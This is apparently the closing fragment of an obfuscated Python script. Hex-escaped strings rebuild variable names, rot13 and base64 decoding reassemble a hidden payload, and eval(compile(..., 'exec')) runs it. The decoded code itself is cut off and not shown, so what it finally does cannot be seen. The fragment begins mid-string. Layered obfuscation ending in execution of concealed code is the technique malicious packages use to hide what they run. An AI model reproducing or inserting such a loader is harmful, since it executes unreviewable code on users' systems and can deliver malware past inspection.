O1pTkiLJDbVzgcq2xvYPOznJkyqTI4qPxAPt=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
